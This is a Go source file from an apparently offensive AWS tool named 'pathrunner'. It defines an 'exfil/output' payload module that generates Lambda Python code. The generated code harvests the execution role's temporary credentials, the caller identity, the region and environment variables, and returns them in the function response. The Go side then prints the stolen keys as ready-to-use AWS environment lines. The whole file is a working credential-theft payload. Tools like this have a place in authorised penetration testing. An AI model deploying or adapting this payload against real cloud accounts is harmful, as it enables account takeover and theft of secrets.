package lambda

import (
	"encoding/json"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
	"strings"
)

type ExfilOutputPayload struct{}

func NewExfilOutputPayload() *ExfilOutputPayload {
	return &ExfilOutputPayload{}
}

func init() {
	// Auto-register this payload
	payloads.Register(NewExfilOutputPayload())
}

func (p *ExfilOutputPayload) GetName() string {
	return "exfil/output"
}

func (p *ExfilOutputPayload) GetDescription() string {
	return "Extract credentials and return them in the Lambda function response"
}

func (p *ExfilOutputPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguagePython,
		payloads.TagTechniqueExfil,
		payloads.TagTransportOutput,
	}
}

func (p *ExfilOutputPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "INCLUDE_ENV",
			Description: "Include Lambda environment variables in output",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "INCLUDE_TAGS",
			Description: "Include function tags in output",
			Required:    false,
			Default:     "false",
		},
	}
}

func (p *ExfilOutputPayload) GenerateCode(options map[string]string) (string, error) {
	includeEnv := options["INCLUDE_ENV"] == "true"
	includeTags := options["INCLUDE_TAGS"] == "true"

	envCode := ""
	if includeEnv {
		envCode = `
        env_vars = dict(os.environ)
        result['environment'] = env_vars`
	}

	tagsCode := ""
	if includeTags {
		tagsCode = `
        try:
            lambda_client = boto3.client('lambda')
            tags_response = lambda_client.get_function(FunctionName=context.function_name)
            result['function_info'] = {
                'arn': tags_response.get('Configuration', {}).get('FunctionArn'),
                'role': tags_response.get('Configuration', {}).get('Role'),
                'tags': tags_response.get('Tags', {})
            }
        except Exception as e:
            result['function_info_error'] = str(e)`
	}

	code := `import json
import boto3
import os
import urllib3

def lambda_handler(event, context):
    result = {
        'message': 'Pathrunner credential exfiltration',
        'timestamp': context.aws_request_id
    }

    try:
        # Get temporary credentials from the Lambda execution role
        sts_client = boto3.client('sts')
        caller_identity = sts_client.get_caller_identity()

        result['caller_identity'] = {
            'account': caller_identity.get('Account'),
            'arn': caller_identity.get('Arn'),
            'user_id': caller_identity.get('UserId')
        }

        # Extract credentials from boto3 session
        session = boto3.Session()
        credentials = session.get_credentials()

        if credentials:
            result['credentials'] = {
                'access_key_id': credentials.access_key,
                'secret_access_key': credentials.secret_key,
                'session_token': credentials.token
            }

        # Get region information
        result['region'] = session.region_name or os.environ.get('AWS_REGION', 'unknown')` + envCode + tagsCode + `

        result['status'] = 'success'

    except Exception as e:
        result['status'] = 'error'
        result['error'] = str(e)

    return {
        'statusCode': 200,
        'body': json.dumps(result, indent=2)
    }
`

	return code, nil
}

func (p *ExfilOutputPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Credential Exfiltration Results ===\n\n")

	if status, ok := parsedBody["status"].(string); ok && status == "error" {
		if errorMsg, ok := parsedBody["error"].(string); ok {
			output.WriteString("ERROR: " + errorMsg + "\n")
		}
		return output.String(), nil
	}

	if callerIdentity, ok := parsedBody["caller_identity"].(map[string]interface{}); ok {
		output.WriteString("Caller Identity:\n")
		if account, ok := callerIdentity["account"].(string); ok {
			output.WriteString("  Account: " + account + "\n")
		}
		if arn, ok := callerIdentity["arn"].(string); ok {
			output.WriteString("  ARN: " + arn + "\n")
		}
		if userID, ok := callerIdentity["user_id"].(string); ok {
			output.WriteString("  User ID: " + userID + "\n")
		}
		output.WriteString("\n")
	}

	if credentials, ok := parsedBody["credentials"].(map[string]interface{}); ok {
		output.WriteString("Extracted Credentials:\n")
		if accessKey, ok := credentials["access_key_id"].(string); ok {
			output.WriteString("  AWS_ACCESS_KEY_ID=" + accessKey + "\n")
		}
		if secretKey, ok := credentials["secret_access_key"].(string); ok {
			output.WriteString("  AWS_SECRET_ACCESS_KEY=" + secretKey + "\n")
		}
		if sessionToken, ok := credentials["session_token"].(string); ok {
			output.WriteString("  AWS_SESSION_TOKEN=" + sessionToken + "\n")
		}
		output.WriteString("\n")
	}

	if region, ok := parsedBody["region"].(string); ok {
		output.WriteString("Region: " + region + "\n\n")
	}

	if env, ok := parsedBody["environment"].(map[string]interface{}); ok {
		output.WriteString("Environment Variables:\n")
		for key, value := range env {
			if strings.HasPrefix(key, "AWS_") || strings.HasPrefix(key, "LAMBDA_") {
				if strValue, ok := value.(string); ok {
					output.WriteString("  " + key + "=" + strValue + "\n")
				}
			}
		}
		output.WriteString("\n")
	}

	return output.String(), nil
}

func (p *ExfilOutputPayload) Validate(options map[string]string) error {
	// No required options to validate for this payload
	return nil
}
